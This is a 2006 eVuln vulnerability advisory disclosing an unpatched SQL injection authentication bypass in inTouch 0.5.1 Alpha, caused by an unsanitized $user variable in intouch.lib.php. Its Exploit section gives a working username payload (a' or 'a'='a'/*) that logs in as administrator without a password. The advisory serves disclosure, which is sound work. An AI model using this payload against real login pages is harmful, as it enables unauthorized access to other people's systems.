Subject: [eVuln] inTouch Authentication Bypass


New eVuln Advisory:
inTouch Authentication Bypass

--------------------Summary----------------

Software: inTouch (http://intouch.sourceforge.net/)
Versions: 0.5.1 Alpha
Critical Level: Moderate
Type: SQL Injection
Class: Remote
Status: Unpatched
Exploit: Available
Solution: Not Available
Discovered by: Aliaksandr Hartsuyeu (alex@...ln.com)
Published: 2006.01.01
eVuln ID: EV0008

-----------------Description--------------
Vulnerable scripts:
intouch.lib.php

Variable $user isn't properly sanitized before being used in a SQL query. This can be used to enter administrator area without password.

Condition: magic_quotes_gpc = off

--------------Exploit---------------------
Link:
http://host/index.php

username: a' or 'a'='a'/*
password: anypassword

--------------Solution---------------------
No Patch available.

